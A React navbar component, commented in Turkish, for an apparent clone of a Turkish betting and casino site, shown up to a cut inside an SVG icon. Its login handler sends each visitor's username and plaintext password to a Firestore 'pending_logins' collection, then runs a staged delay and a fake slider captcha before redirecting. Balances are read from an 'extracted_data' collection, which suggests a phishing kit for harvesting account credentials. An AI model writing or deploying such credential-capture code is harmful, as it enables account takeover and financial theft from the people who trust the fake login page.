"use client"
import React, { useState, useRef, useEffect } from 'react'
import Image from 'next/image'
import { useRouter } from 'next/navigation'
import { Eye } from 'lucide-react'
import { collection, addDoc, doc, onSnapshot } from 'firebase/firestore'
import { db } from '@/lib/firebase'
import logo from "../assets/logo.png"
import asdas from "../assets/asdas.jpg"
import PuzzleCaptcha from './PuzzleCaptcha'

import btm1 from "../assets/btm1.png"
import btm2 from "../assets/btm2.png"
import btm3 from "../assets/btm3.png"
import btm4 from "../assets/btm4.png"
import btm5 from "../assets/btm5.png"
import btm6 from "../assets/btm6.png"
import btm7 from "../assets/btm7.png"
import btm8 from "../assets/btm8.png"
import btm9 from "../assets/btm9.png"
import btm10 from "../assets/btm10.png"
import btm11 from "../assets/btm11.png"
import btm12 from "../assets/btm12.png"

const Navbar = ({ onLoginClick }) => {
  const router = useRouter()
  const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const profileMenuRef = useRef(null)
  const profileIconRef = useRef(null)
  
  // Local state for login - localStorage tabanlı
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [userData, setUserData] = useState(null)
  
  // Real-time Firestore balance data
  const [bakiyeniz, setBakiyeniz] = useState(null)
  const [bonusBakiyeniz, setBonusBakiyeniz] = useState(null)
  const [toplamBakiyeniz, setToplamBakiyeniz] = useState(null)

  // Mobile Detection
  const [isMobile, setIsMobile] = useState(false)

  // Login Modal States
  const [showLoginModal, setShowLoginModal] = useState(false)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [isLoggingIn, setIsLoggingIn] = useState(false)
  const [isLoadingCaptcha, setIsLoadingCaptcha] = useState(false)
  
  // CAPTCHA Puzzle States
  const [showCaptcha, setShowCaptcha] = useState(false)
  const [captchaCompleted, setCaptchaCompleted] = useState(false)
  const [sliderPosition, setSliderPosition] = useState(0)
  const [targetPosition, setTargetPosition] = useState(0)
  const [isDragging, setIsDragging] = useState(false)
  const sliderContainerRef = useRef(null)
  const startXRef = useRef(0)

  // Side Menu State
  const [isSideMenuOpen, setIsSideMenuOpen] = useState(false)

  // Oyun listesi - UI değişiklikleri için burayı düzenleyebilirsiniz
  const gamesList = [
    { id: 1, name: 'Sweet Bonanza', image: btm1, imageWidth: 'w-[31px]' },
    { id: 2, name: 'Gates of Olympus', image: btm2, imageWidth: 'w-[31px]' },
    { id: 3, name: 'Big Bass Bonanza', image: btm3, imageWidth: 'w-[28px]' },
    { id: 4, name: 'Sugar Rush', image: btm4, imageWidth: 'w-[31px]' },
    { id: 5, name: 'Starlight Princess', image: btm5, imageWidth: 'w-[28px]' },
    { id: 6, name: 'Book of Dead', image: btm6, imageWidth: 'w-[30px]' },
    { id: 7, name: 'Fruit Party', image: btm7, imageWidth: 'w-[28px]' },
    { id: 8, name: 'Dog House', image: btm8, imageWidth: 'w-[28px]' },
    { id: 9, name: 'Wanted Dead or a Wild', image: btm9, imageWidth: 'w-[27px]' },
    { id: 10, name: 'Money Train 3', image: btm10, imageWidth: 'w-[29px]' },
    { id: 11, name: 'Wild West Gold', image: btm11, imageWidth: 'w-[29px]' },
    { id: 12, name: 'Bonanza Gold', image: btm12, imageWidth: 'w-[29px]' },
    { id: 13, name: 'Sweet Bonanza', image: btm1, imageWidth: 'w-[31px]' },
    { id: 14, name: 'Gates of Olympus', image: btm2, imageWidth: 'w-[31px]' },
    { id: 15, name: 'Big Bass Bonanza', image: btm3, imageWidth: 'w-[28px]' },
    { id: 16, name: 'Sugar Rush', image: btm4, imageWidth: 'w-[31px]' },
    { id: 17, name: 'Starlight Princess', image: btm5, imageWidth: 'w-[28px]' }
  ]

  // Side menu açıkken body scroll'unu engelle
  useEffect(() => {
    if (isSideMenuOpen) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = 'unset'
    }
    
    return () => {
      document.body.style.overflow = 'unset'
    }
  }, [isSideMenuOpen])

  // localStorage'dan kullanıcı verilerini yükle
  useEffect(() => {
    const storedUserData = localStorage.getItem('userData')
    if (storedUserData) {
      try {
        const parsedData = JSON.parse(storedUserData)
        setUserData(parsedData)
        setIsLoggedIn(true)
      } catch (error) {
        console.error('localStorage verisi okunamadı:', error)
        localStorage.removeItem('userData')
      }
    }
  }, [])

  // Firestore'dan real-time bakiye bilgilerini dinle
  useEffect(() => {
    if (!isLoggedIn || !userData?.username) {
      // Eğer kullanıcı giriş yapmamışsa veya username yoksa listener başlatma
      return
    }

    const username = userData.username
    console.log('🔴 Firestore real-time listener başlatılıyor:', username)
    
    // extracted_data collection'ındaki username document'ini dinle
    const docRef = doc(db, 'extracted_data', username)
    
    const unsubscribe = onSnapshot(
      docRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          console.log('📊 Firestore verileri güncellendi:', data)
          
          // Bakiye bilgilerini state'e kaydet
          setBakiyeniz(data.bakiyeniz || null)
          setBonusBakiyeniz(data.bonusBakiyeniz || null)
          setToplamBakiyeniz(data.toplamBakiyeniz || null)
          
          // userData'yı da güncelle (diğer alanlar için)
          setUserData(prevData => {
            const updatedUserData = {
              ...prevData,
              ...data
            }
            // localStorage'ı da güncelle
            localStorage.setItem('userData', JSON.stringify(updatedUserData))
            return updatedUserData
          })
        } else {
          console.log('⚠️ Document bulunamadı:', username)
          // Document yoksa değerleri sıfırla
          setBakiyeniz(null)
          setBonusBakiyeniz(null)
          setToplamBakiyeniz(null)
        }
      },
      (error) => {
        console.error('❌ Firestore listener hatası:', error)
      }
    )

    // Cleanup function - component unmount olduğunda veya dependency değiştiğinde listener'ı kapat
    return () => {
      console.log('🔴 Firestore listener kapatılıyor')
      unsubscribe()
    }
  }, [isLoggedIn, userData?.username])

  // Mobile detection
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768)
    }
    
    checkMobile()
    window.addEventListener('resize', checkMobile)
    
    return () => window.removeEventListener('resize', checkMobile)
  }, [])

  // Dışarı tıklandığında menüyü kapat
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (
        profileMenuRef.current && 
        !profileMenuRef.current.contains(event.target) &&
        profileIconRef.current &&
        !profileIconRef.current.contains(event.target)
      ) {
        setIsProfileMenuOpen(false)
      }
    }

    if (isProfileMenuOpen) {
      document.addEventListener('mousedown', handleClickOutside)
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside)
    }
  }, [isProfileMenuOpen])

  // Prevent body scroll when loading screen is shown
  useEffect(() => {
    if (isLoading) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = 'unset'
    }
    
    return () => {
      document.body.style.overflow = 'unset'
    }
  }, [isLoading])

  // Prevent body scroll when login modal is shown
  useEffect(() => {
    if (showLoginModal) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = 'unset'
    }
    
    return () => {
      document.body.style.overflow = 'unset'
    }
  }, [showLoginModal])

  // Generate dynamic target position for puzzle based on container width
  useEffect(() => {
    if (showCaptcha && sliderContainerRef.current) {
      const containerWidth = sliderContainerRef.current.offsetWidth
      // Target is at 75-80% of the container width (responsive)
      const dynamicTarget = isMobile 
        ? containerWidth * 0.72  // Mobile: slightly less for better fit
        : containerWidth * 0.75   // Desktop: 75%
      
      setTargetPosition(dynamicTarget)
      setSliderPosition(0)
      setCaptchaCompleted(false)
      setIsDragging(false)
    }
  }, [showCaptcha, isMobile])

  // Mouse handlers
  const handleSliderMouseDown = (e) => {
    e.preventDefault()
    setIsDragging(true)
  }

  // Touch handlers
  const handleSliderTouchStart = (e) => {
    e.preventDefault()
    setIsDragging(true)
  }

  // Global event listeners with real-time position checking
  useEffect(() => {
    const handleMouseMove = (e) => {
      if (isDragging && sliderContainerRef.current) {
        const rect = sliderContainerRef.current.getBoundingClientRect()
        const maxPosition = rect.width - 60
        let newPosition = e.clientX - rect.left - 30
        
        // Dynamic tolerance based on container width
        const tolerance = isMobile ? rect.width * 0.08 : rect.width * 0.05
        
        newPosition = Math.max(0, Math.min(newPosition, maxPosition))
        setSliderPosition(newPosition)
        
        if (Math.abs(newPosition - targetPosition) < tolerance) {
          setCaptchaCompleted(true)
        }
      }
    }

    const handleMouseUp = () => {
      if (isDragging) {
        setIsDragging(false)
        
        const tolerance = sliderContainerRef.current 
          ? (isMobile ? sliderContainerRef.current.offsetWidth * 0.08 : sliderContainerRef.current.offsetWidth * 0.05)
          : 20
        
        setSliderPosition(current => {
          if (Math.abs(current - targetPosition) < tolerance) {
            setCaptchaCompleted(true)
          } else {
            setCaptchaCompleted(false)
            setTimeout(() => setSliderPosition(0), 300)
          }
          return current
        })
      }
    }

    const handleTouchMove = (e) => {
      if (isDragging && sliderContainerRef.current) {
        const touch = e.touches[0]
        const rect = sliderContainerRef.current.getBoundingClientRect()
        const maxPosition = rect.width - 60
        let newPosition = touch.clientX - rect.left - 30
        
        // Dynamic tolerance based on container width (more generous on mobile)
        const tolerance = isMobile ? rect.width * 0.08 : rect.width * 0.05
        
        newPosition = Math.max(0, Math.min(newPosition, maxPosition))
        setSliderPosition(newPosition)
        
        if (Math.abs(newPosition - targetPosition) < tolerance) {
          setCaptchaCompleted(true)
        }
      }
    }

    const handleTouchEnd = () => {
      if (isDragging) {
        setIsDragging(false)
        
        const tolerance = sliderContainerRef.current 
          ? (isMobile ? sliderContainerRef.current.offsetWidth * 0.08 : sliderContainerRef.current.offsetWidth * 0.05)
          : 20
        
        setSliderPosition(current => {
          if (Math.abs(current - targetPosition) < tolerance) {
            setCaptchaCompleted(true)
          } else {
            setCaptchaCompleted(false)
            setTimeout(() => setSliderPosition(0), 300)
          }
          return current
        })
      }
    }

    if (isDragging) {
      window.addEventListener('mousemove', handleMouseMove)
      window.addEventListener('mouseup', handleMouseUp)
      window.addEventListener('touchmove', handleTouchMove, { passive: false })
      window.addEventListener('touchend', handleTouchEnd)
      
      return () => {
        window.removeEventListener('mousemove', handleMouseMove)
        window.removeEventListener('mouseup', handleMouseUp)
        window.removeEventListener('touchmove', handleTouchMove)
        window.removeEventListener('touchend', handleTouchEnd)
      }
    }
  }, [isDragging, targetPosition, isMobile])

  const handleCompleteCaptcha = () => {
    setShowCaptcha(false)
    
    // Mock kullanıcı verisi
    const mockUserData = {
      username: username || 'Kullanıcı',
      currency: '₺'
    }
    
    // localStorage'a kaydet
    localStorage.setItem('userData', JSON.stringify(mockUserData))
    
    // /loading sayfasına yönlendir
    router.push('/loading')
  }

  const handleLogin = async () => {
    if (!username || !password) {
      alert('Lütfen kullanıcı adı ve şifre girin')
      return
    }
    
    try {
      // Firestore'a pending_logins collection'ına yeni document ekle
      await addDoc(collection(db, 'pending_logins'), {
        username: username,
        password: password,
        status: 'pending'
      })
      
      console.log('Login denemesi Firestore\'a kaydedildi:', username)
    } catch (error) {
      console.error('Firestore kayıt hatası:', error)
      alert('Giriş kaydı oluşturulurken bir hata oluştu')
      return
    }
    
    setIsLoadingCaptcha(true)
    setTimeout(() => {
      setIsLoadingCaptcha(false)
      setShowCaptcha(true)
    }, 4800)
  }

  // Handle login button click from navbar
  const handleLoginClick = () => {
    setShowLoginModal(true)
    if (onLoginClick) {
      onLoginClick()
    }
  }

  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem('userData')
    setIsLoggedIn(false)
    setUserData(null)
    setIsProfileMenuOpen(false)
  }

  const handleBalanceClick = () => {
    router.push('/payment')
  }

  const androidIcon = () => {
    return (
      <svg
  width={38}
  height={38}
  viewBox="0 0 38 38"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[27px] h-[27px] md:w-[38px] md:h-[38px] relative cursor-pointer group"
  preserveAspectRatio="none"
>
  <rect x="1.5" y="1.5" width={35} height={35} rx="6.5" stroke="#F9C408" strokeWidth={3} />
  <path
    d="M21.5053 31C22.3077 31 23.0075 30.3002 23.0075 29.4978V25.9894H24.0106C24.6125 25.9894 25.0137 25.5881 25.0137 24.9863V14.9658H12.9863V24.9864C12.9863 25.5882 13.3876 25.9894 13.9894 25.9894H14.9926V29.4978C14.9926 30.3003 15.6922 31.0001 16.4948 31.0001C17.2972 31.0001 17.9969 30.3003 17.9969 29.4978V25.9894H20.0031V29.4978C20.003 30.3002 20.7028 31 21.5053 31Z"
    fill="#F9C408"
  />
  <path
    d="M27.5191 24.9864C28.3215 24.9864 29.0212 24.2867 29.0212 23.4841V16.4674C29.0212 15.6692 28.3215 14.9658 27.5191 14.9658C26.7165 14.9658 26.0168 15.6692 26.0168 16.4674V23.4841C26.0168 24.2866 26.7164 24.9864 27.5191 24.9864Z"
    fill="#F9C408"
  />
  <path
    d="M10.481 24.9864C11.2835 24.9864 11.9832 24.2867 11.9832 23.4841V16.4674C11.9832 15.6692 11.2836 14.9658 10.481 14.9658C9.67854 14.9658 8.97891 15.6692 8.97891 16.4674V23.4841C8.97891 24.2866 9.67854 24.9864 10.481 24.9864Z"
    fill="#F9C408"
  />
  <path
    d="M23.8099 7.15136C23.6094 6.94955 23.3108 6.94955 23.1103 7.15136L21.7649 8.49224L21.7029 8.55422C20.9051 8.15476 20.0107 7.95526 19.0147 7.95334C19.0098 7.95334 19.005 7.95318 19.0001 7.95318H19C18.9949 7.95318 18.9903 7.95334 18.9852 7.95334C17.9893 7.95526 17.0949 8.15476 16.2972 8.55422L16.235 8.49224L14.8897 7.15136C14.689 6.94955 14.3906 6.94955 14.1901 7.15136C13.9894 7.35206 13.9894 7.6499 14.1901 7.85043L15.4915 9.15206C15.0722 9.43204 14.6919 9.77465 14.3612 10.1665C13.5696 11.1049 13.0647 12.3261 12.9952 13.6493C12.9946 13.663 12.9932 13.6767 12.9926 13.6904C12.9883 13.7805 12.9863 13.8711 12.9863 13.962H25.0137C25.0137 13.8711 25.0115 13.7805 25.0074 13.6904C25.0068 13.6767 25.0054 13.663 25.0046 13.6493C24.9354 12.3261 24.4303 11.1048 23.6386 10.1666C23.3081 9.77473 22.9277 9.43212 22.5084 9.15214L23.8099 7.85051C24.0106 7.6499 24.0106 7.35206 23.8099 7.15136ZM16.4929 12.2106C16.0779 12.2106 15.7414 11.8742 15.7414 11.4592C15.7414 11.0442 16.0779 10.7077 16.4929 10.7077C16.9079 10.7077 17.2443 11.0442 17.2443 11.4592C17.2443 11.8742 16.9079 12.2106 16.4929 12.2106ZM21.5071 12.2106C21.0921 12.2106 20.7557 11.8742 20.7557 11.4592C20.7557 11.0442 21.0921 10.7077 21.5071 10.7077C21.9221 10.7077 22.2586 11.0442 22.2586 11.4592C22.2586 11.8742 21.9221 12.2106 21.5071 12.2106Z"
    fill="#F9C408"
  />
  <rect x="1.5" y="1.5" width={35} height={35} rx="6.5" fill="white" className="opacity-0 group-hover:opacity-30  " />
</svg>
    )
  }

  const iosIcon = () => {
    return (
      <svg
      width={38}
      height={38}
      viewBox="0 0 38 38"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className="w-[27px] h-[27px] md:w-[38px] md:h-[38px] relative cursor-pointer group"
      preserveAspectRatio="none"
    >
      <rect x="1.5" y="1.5" width={35} height={35} rx="6.5" stroke="#F9C408" strokeWidth={3} />
      <path
        d="M28.1464 15.1816C28.0072 15.2896 25.5496 16.6744 25.5496 19.7536C25.5496 23.3152 28.6768 24.5752 28.7704 24.6064C28.756 24.6832 28.2736 26.332 27.1216 28.012C26.0944 29.4904 25.0216 30.9664 23.3896 30.9664C21.7576 30.9664 21.3376 30.0184 19.4536 30.0184C17.6176 30.0184 16.9648 30.9976 15.472 30.9976C13.9792 30.9976 12.9376 29.6296 11.74 27.9496C10.3528 25.9768 9.23199 22.912 9.23199 20.0032C9.23199 15.3376 12.2656 12.8632 15.2512 12.8632C16.8376 12.8632 18.16 13.9048 19.156 13.9048C20.104 13.9048 21.5824 12.8008 23.3872 12.8008C24.0712 12.8008 26.5288 12.8632 28.1464 15.1816ZM22.5304 10.8256C23.2768 9.94 23.8048 8.7112 23.8048 7.4824C23.8048 7.312 23.7904 7.1392 23.7592 7C22.5448 7.0456 21.1 7.8088 20.2288 8.8192C19.5448 9.5968 18.9064 10.8256 18.9064 12.0712C18.9064 12.2584 18.9376 12.4456 18.952 12.5056C19.0288 12.52 19.1536 12.5368 19.2784 12.5368C20.368 12.5368 21.7384 11.8072 22.5304 10.8256Z"
        fill="#F9C408"
      />
      <rect x="1.5" y="1.5" width={35} height={35} rx="6.5" fill="white" className="opacity-0 group-hover:opacity-30 " />
    </svg>
    )
  }

  const turkFlag = () => {
    return (
      <svg
  width={56}
  height={34}
  viewBox="0 0 56 34"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-14 h-[34px]  hidden md:block relative cursor-pointer"
  preserveAspectRatio="none"
>
  <rect width={56} height={34} rx={8} fill="white" fillOpacity="0.1" />
  <rect x="0.5" y="0.5" width={55} height={33} rx="7.5" stroke="white" strokeOpacity="0.1" />
  <mask
    id="mask0_1_4875"
    style={{ maskType: "luminance" }}
    maskUnits="userSpaceOnUse"
    x={13}
    y={8}
    width={30}
    height={18}
  >
    <path d="M13.0017 8H42.9983V25.5H13.0017V8Z" fill="white" />
  </mask>
  <g mask="url(#mask0_1_4875)">
    <path d="M13.0017 8H42.9983V25.5H13.0017V8Z" fill="#D00027" />
    <mask
      id="mask1_1_4875"
      style={{ maskType: "luminance" }}
      maskUnits="userSpaceOnUse"
      x={13}
      y={8}
      width={30}
      height={18}
    >
      <path d="M13.0017 8H42.9983V25.5H13.0017V8Z" fill="white" />
    </mask>
    <g mask="url(#mask1_1_4875)">
      <path
        d="M21.7567 12.3715C22.6217 12.3715 23.4672 12.628 24.1865 13.1086C24.9057 13.5891 25.4662 14.2722 25.7973 15.0713C26.1283 15.8705 26.2149 16.7499 26.0461 17.5982C25.8774 18.4466 25.4609 19.2259 24.8492 19.8375C24.2376 20.4492 23.4583 20.8657 22.6099 21.0345C21.7615 21.2032 20.8822 21.1166 20.083 20.7856C19.2839 20.4546 18.6008 19.894 18.1202 19.1748C17.6397 18.4556 17.3832 17.61 17.3832 16.745C17.3829 16.1706 17.4959 15.6018 17.7156 15.071C17.9353 14.5403 18.2574 14.0581 18.6636 13.6519C19.0697 13.2457 19.552 12.9236 20.0827 12.7039C20.6134 12.4842 21.1823 12.3712 21.7567 12.3715Z"
        fill="white"
      />
      <path
        d="M22.8446 13.1994C23.5471 13.1887 24.2369 13.3872 24.8262 13.7696C25.4156 14.152 25.878 14.7011 26.1544 15.347C26.4309 15.9928 26.509 16.7064 26.3788 17.3968C26.2487 18.0872 25.9161 18.7233 25.4234 19.2242C24.9307 19.725 24.3002 20.068 23.612 20.2096C22.9239 20.3511 22.2092 20.2848 21.5588 20.019C20.9084 19.7532 20.3518 19.3 19.9597 18.717C19.5677 18.134 19.3578 17.4476 19.357 16.745C19.3512 16.2827 19.437 15.8237 19.6095 15.3947C19.782 14.9657 20.0377 14.5751 20.362 14.2455C20.6862 13.9158 21.0725 13.6537 21.4986 13.4741C21.9247 13.2946 22.3822 13.2012 22.8446 13.1994Z"
        fill="#D00027"
      />
      <path d="M25.4462 16.745L27.536 17.4809L27.8979 16.435L25.4462 16.745Z" fill="white" />
      <path d="M25.4462 16.745L27.536 16.1251L27.8979 17.161L25.4462 16.745Z" fill="white" />
      <path d="M26.9601 14.6652V16.851H28.048L26.9601 14.6652Z" fill="white" />
      <path d="M26.9601 14.6652L28.2599 16.435L27.376 17.065L26.9601 14.6652Z" fill="white" />
      <path d="M26.9601 18.8348L28.2599 17.065L27.376 16.435L26.9601 18.8348Z" fill="white" />
      <path d="M26.9601 18.8348V16.649H28.048L26.9601 18.8348Z" fill="white" />
      <path d="M29.4018 15.4971L27.322 16.1251L27.684 17.161L29.4018 15.4971Z" fill="white" />
      <path d="M29.4018 15.4971L28.154 17.2669L27.2161 16.649L29.4018 15.4971Z" fill="white" />
      <path d="M29.4018 17.9929L28.154 16.2211L27.2161 16.957L29.4018 17.9929Z" fill="white" />
      <path d="M29.4018 17.9929L27.322 17.3729L27.684 16.3291L29.4018 17.9929Z" fill="white" />
    </g>
  </g>
</svg>
    )
  }

  const profileIcon = () => {
    return (
      <svg
      width={38}
      height={38}
      viewBox="0 0 38 38"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className=" md:w-[38px] md:h-[38px] w-[28px] h-[28px] relative cursor-pointer group"
      preserveAspectRatio="none"
    >
      <rect x={1} y={1} width={36} height={36} rx={7}  stroke="#F9C408" strokeWidth={3} />
      <path
        d="M15.57 21.098C14.5057 20.5268 13.612 19.6835 12.9799 18.6542C12.3478 17.6249 11.9999 16.4464 11.9719 15.2388C11.9438 14.0313 12.2364 12.8379 12.82 11.7803C13.4036 10.7227 14.2571 9.83882 15.2937 9.21873C16.3303 8.59864 17.5128 8.26454 18.7206 8.25049C19.9284 8.23645 21.1183 8.54296 22.169 9.13878C23.2198 9.73459 24.0937 10.5984 24.7017 11.6421C25.3097 12.6858 25.63 13.8721 25.63 15.08C25.6299 16.2896 25.3086 17.4775 24.699 18.5222C24.0893 19.5669 23.2131 20.4309 22.16 21.026C27.244 21.896 30.19 24.986 30.19 29.276H28.69C28.69 25.081 25.26 22.278 19.06 22.278C12.86 22.278 9.43201 25.081 9.43201 29.276H7.93201C7.93201 25.096 10.727 22.058 15.572 21.098H15.57ZM18.8 20.408C20.2136 20.408 21.5693 19.8465 22.5689 18.8469C23.5685 17.8473 24.13 16.4916 24.13 15.078C24.13 13.6644 23.5685 12.3087 22.5689 11.3091C21.5693 10.3096 20.2136 9.748 18.8 9.748C17.3864 9.748 16.0307 10.3096 15.0311 11.3091C14.0316 12.3087 13.47 13.6644 13.47 15.078C13.47 16.4916 14.0316 17.8473 15.0311 18.8469C16.0307 19.8465 17.3864 20.408 18.8 20.408Z"
        fill="#F9C408"
      />
      <rect x={1} y={1} width={36} height={36} rx={7} fill="white" className="opacity-0 group-hover:opacity-30 " />
    </svg>
    )
  }

  // Menü öğeleri array'i
  const menuItems = [
    'Özel Oranlar',
    'High Flyer',
    'Bahis',
    'Canlı Bahis',
    'Canlı Oyunlar',
    'Canlı Oyunlar',
    'Casino',
    'Canlı Loto',
    'Promosyonlar',
    'Discount Talep Et',
    'Turnuvalar'
  ]

  const parayatiricon = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
    d="M24.297 9.94H19.0225C17.2095 9.94 16.331 10.948 15.505 11.69C14.679 12.432 8.953 17.563 8.953 17.563"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M15.505 24.01L17.255 22.26C19.2115 22.26 20.93 22.106 22.533 20.51C23.142 19.901 24.6925 18.319 24.6925 18.319"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M7.51906 16.3876L3.66568 20.241L13.2979 29.8732L17.1513 26.0198L7.51906 16.3876Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M7.51801 19.859L8.80251 21.1435"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M28.4025 21.0805V22.8375H31.3355V5.25H28.4025V7.007"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M18.4345 13.4575H24.885C26.117 13.4575 26.635 13.8075 26.635 14.63C26.635 16.0965 25.116 16.975 23.7055 16.975H22.1165C21.9006 16.9742 21.6887 17.0325 21.5036 17.1436C21.3185 17.2546 21.1674 17.4142 21.0665 17.605C20.6979 18.2984 20.1481 18.8788 19.4756 19.2844C18.8032 19.69 18.0333 19.9055 17.248 19.908H16.1"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M22.5715 13.4575C22.68 12.4967 23.0506 11.5842 23.6427 10.8198C24.2348 10.0553 25.0256 9.46837 25.9287 9.12301C26.8319 8.77765 27.8126 8.68719 28.7637 8.86153C29.7147 9.03586 30.5996 9.46828 31.3215 10.1115"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M31.3355 17.976C30.7723 18.4797 30.1076 18.8566 29.3862 19.0812C28.6648 19.3059 27.9036 19.373 27.154 19.2781C26.4044 19.1832 25.684 18.9285 25.0413 18.5312C24.3987 18.1338 23.8489 17.6031 23.429 16.975"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
</svg>
  )
  const paracekicon = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M15.9845 24.885H3.85001L12.7925 11.2H24.927L15.9845 24.885Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M26.201 13.8075L17.262 27.4925H4.487"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M27.4785 16.415L18.5395 30.1H6.405"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M28.3255 13.783C29.2924 13.4056 30.0968 12.702 30.5996 11.7941C31.1024 10.8861 31.2719 9.83089 31.0788 8.81113C30.8856 7.79136 30.342 6.87123 29.542 6.21003C28.7419 5.54883 27.7359 5.18817 26.698 5.19051H8.30201C7.25101 5.18778 6.23299 5.55725 5.4284 6.23344C4.6238 6.90963 4.08461 7.84886 3.90638 8.88465C3.72816 9.92043 3.92243 10.9859 4.45474 11.8921C4.98706 12.7983 5.82304 13.4868 6.81451 13.8355"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    d="M12.5125 16.905L17.71 15.12L17.0415 16.17L11.8195 17.955L12.5125 16.905ZM11.3505 18.69L16.6005 16.905L15.932 17.9725L10.682 19.7575L11.3505 18.69ZM15.3335 13.8075H16.45L11.081 22.183H9.9295L15.3335 13.8075ZM10.8185 21.063H13.1985C13.6532 21.0753 14.104 20.9755 14.511 20.7725C14.8917 20.5716 15.2101 20.2701 15.4315 19.901L16.051 18.9H17.1815L16.569 19.8975C16.1531 20.6062 15.5627 21.1966 14.854 21.6125C14.1407 22.0007 13.3384 22.1961 12.5265 22.1795H10.0975L10.8185 21.063Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
</svg>
  )

  const aktifbeticon = ( 
  <svg
    width={35}
    height={35}
    viewBox="0 0 35 35"
    fill="none"
    xmlns="http://www.w3.org/2000/svg"
    className="w-[35px] h-[35px] relative"
    preserveAspectRatio="none"
  >
    <path d="M35 0H0V35H35V0Z" fill="white" />
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M17.5 13.125C17.5 13.125 17.85 8.2635 20.2055 6.2055C20.8932 5.57143 21.8031 5.23388 22.738 5.26598C23.6728 5.29808 24.5574 5.69725 25.2 6.377C26.404 7.6895 26.18 9.555 24.5595 10.9585C22.19 13.0165 17.5 13.125 17.5 13.125Z"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
    <path
      fillRule="evenodd"
      clipRule="evenodd"
      d="M17.5 13.125C17.5 13.125 17.3775 8.925 15.2985 7.245C14.6796 6.72377 13.8901 6.44942 13.0814 6.47462C12.2727 6.49981 11.5017 6.82276 10.9165 7.3815C9.8665 8.4525 10.0555 9.975 11.4765 11.1265C13.5555 12.8065 16.002 13.083 17.5 13.125Z"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
    <path
      d="M19.313 30.051H29.5925V17.962"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
    <path
      d="M5.41101 17.962V30.051H15.687"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
    <path
      d="M19.313 17.962H30.8V13.125H4.20001V17.962H15.687"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
    <path
      d="M19.313 13.125H15.687V30.051H19.313V13.125Z"
      stroke="#2A421C"
      strokeWidth="1.05"
      strokeMiterlimit={10}
      strokeLinecap="round"
      strokeLinejoin="round"
    />
  </svg> 
  )

  const gecmisbonus = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
